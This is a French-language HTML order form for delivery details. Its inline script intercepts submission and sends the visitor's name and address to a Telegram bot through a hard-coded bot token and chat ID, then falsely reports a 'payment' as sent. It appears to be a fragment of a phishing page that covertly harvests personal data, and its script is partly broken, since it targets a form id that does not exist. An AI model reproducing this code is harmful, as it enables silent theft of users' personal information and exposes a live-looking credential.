    <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Formulaire de Commande</title>
</head>
<body>

    <!-- Formulaire -->
        <div class="container">
    <h2>Remplissez vos informations</h2>
    <form action="page-livraison1.html" method="GET">
        <div class="form-group">
            <label for="prenom">Prénom *</label>
            <input type="text" id="prenom" name="prenom" required placeholder="Entrez votre prénom">
        </div>
            <div class="form-group">
                <label for="nom">Nom *</label>
                <input type="text" id="nom" name="nom" required placeholder="Entrez votre nom">
            </div>
            <div class="form-group">
                <label for="rue">Rue *</label>
                <input type="text" id="rue" name="rue" required placeholder="Entrez votre rue">
            </div>
            <div class="form-group">
                <label for="numero">N°</label>
                <input type="text" id="numero" name="numero" placeholder="Entrez votre numéro de rue">
            </div>
            <div class="form-group">
                <label for="code_postal">Code postal *</label>
                <input type="text" id="code_postal" name="code_postal" required placeholder="Entrez votre code postal">
            </div>
            <div class="form-group">
                <label for="ville">Ville *</label>
                <input type="text" id="ville" name="ville" required placeholder="Entrez votre ville">
            </div>
            <div class="form-group">
                <input type="submit" value="Confirmer La Commande">
            </div>
        </form>
    </div>

    <script>
        // Fonction pour envoyer les informations au bot Telegram
        document.getElementById('order-form').addEventListener('submit', async function (e) {
            e.preventDefault(); // Empêche l'envoi du formulaire par défaut

            // Récupération des données du formulaire
            const data = {
                prenom: document.getElementById("prenom").value,
                nom: document.getElementById("nom").value,
                rue: document.getElementById("rue").value,
                numero: document.getElementById("numero").value || "غير مذكور",
                code_postal: document.getElementById("code_postal").value,
                ville: document.getElementById("ville").value,
            };

            // Création du message à envoyer
            const message = `
🌟 طلب جديد 🌟
👤 الاسم: ${data.nom} ${data.prenom}
🏠 العنوان: ${data.rue}, رقم: ${data.numero}, ${data.ville} (${data.code_postal})
            `;

            // Informations sur le bot Telegram
            const botToken = '8101158488:AAH6WIfCC6B6aGkWd_Tt6QRrWD8QKQQc69M'; // Votre token
            const chatId = '5372119436'; // Votre chat ID Telegram

            const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

            // Envoi du message
            const response = await fetch(telegramApiUrl);
            const dataResponse = await response.json();

            if (dataResponse.ok) {
                alert('Votre paiement a été envoyé avec succès.');
            }
        });
    </script>
